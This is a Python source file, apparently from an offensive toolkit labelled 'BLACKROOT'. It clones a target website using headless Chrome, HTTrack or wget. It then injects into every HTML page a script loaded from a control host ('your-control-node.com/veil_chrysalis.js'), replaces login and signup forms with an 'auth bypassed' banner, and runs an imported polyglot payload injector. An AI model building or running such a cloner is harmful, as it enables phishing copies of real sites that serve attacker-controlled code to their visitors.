import os, re, subprocess, shutil, logging
from pathlib import Path
from urllib.parse import urlparse

LOG = logging.getLogger("PowerClone")

# Polyglot injection
from polyglot_builder import inject_polyglot

# ---------- CONFIG ----------
CHROMIUM_PATH = shutil.which("chromium-browser") or shutil.which("google-chrome")
HTTRACK_BIN   = shutil.which("httrack")            # fallback if wget fails
VEIL_URL      = "https://your-control-node.com/veil_chrysalis.js"
# ----------------------------

def _chrome_mirror(target: str, out: Path, silent: bool) -> bool:
    """Headless Chrome full-page render."""
    if not CHROMIUM_PATH:
        return False
    cmd = [
        CHROMIUM_PATH,
        "--headless=new",
        "--disable-gpu",
        "--dump-dom",
        "--timeout=30000",
        target
    ]
    try:
        html = subprocess.check_output(cmd, stderr=subprocess.DEVNULL if silent else None, text=True)
        (out / "index.html").write_text(html, encoding="utf-8")
        return True
    except Exception as e:
        LOG.warning("Chrome mirror failed: %s", e)
        return False

def _httrack_mirror(target: str, out: Path, silent: bool) -> bool:
    """HTTrack fallback for complex sites."""
    if not HTTRACK_BIN:
        return False
    cmd = [
        HTTRACK_BIN,
        target,
        "-O", str(out),
        "+*.css", "+*.js", "+*.png", "+*.jpg", "+*.svg", "+*.gif",
        "-r2", "-%v" if not silent else "-q"
    ]
    try:
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL if silent else None)
        return True
    except Exception as e:
        LOG.warning("HTTrack mirror failed: %s", e)
        return False

def _wget_mirror(target: str, out: Path, silent: bool) -> bool:
    """Classic wget mirror."""
    cmd = [
        "wget",
        "--mirror",
        "--convert-links",
        "--adjust-extension",
        "--page-requisites",
        "--no-parent",
        "--directory-prefix", str(out),
        target
    ]
    try:
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL if silent else None)
        return True
    except Exception as e:
        LOG.warning("wget mirror failed: %s", e)
        return False

def _inject_payloads(root: Path):
    """Universal payload injector + login bypass."""
    for html_path in root.rglob("*.html"):
        try:
            html = html_path.read_text(encoding="utf-8", errors="ignore")
            # Bypass login / register forms
            html = re.sub(
                r'(?is)<form[^>]*(?:login|register|signup)[^>]*>.*?</form>',
                lambda m: (
                    f"<!-- BLACKROOT BYPASSED -->\n"
                    f"<div style='color:red;font-weight:bold;'>[BLACKROOT] Auth bypassed.</div>"
                ),
                html
            )
            # Add veil beacon
            if VEIL_URL not in html:
                html += f"\n<script src='{VEIL_URL}'></script><!-- BLACKROOT -->\n"
            html_path.write_text(html, encoding="utf-8", errors="ignore")
        except Exception as e:
            LOG.debug("Inject failed on %s: %s", html_path, e)

def clone_site(target: str, output_dir: str = "clones", silent: bool = False) -> str:
    """
    Power-clone using Chrome → HTTrack → wget fallback.
    Returns the absolute path of the cloned directory.
    """
    LOG.info("🪞 Power-cloning %s", target)
    domain = urlparse(target).netloc or target.split("//")[-1].split("/")[0]
    clone_path = Path(output_dir) / domain
    clone_path.mkdir(parents=True, exist_ok=True)

    # 1) Chrome headless → 2) HTTrack → 3) wget
    for mirror_func in (_chrome_mirror, _httrack_mirror, _wget_mirror):
        if mirror_func(target, clone_path, silent):
            break
    else:
        LOG.error("❌ All mirrors failed for %s", target)
        return str(clone_path)

    _inject_payloads(clone_path)
    inject_polyglot(str(clone_path))
    LOG.info("✅ Clone ready at %s", clone_path)
    return str(clone_path)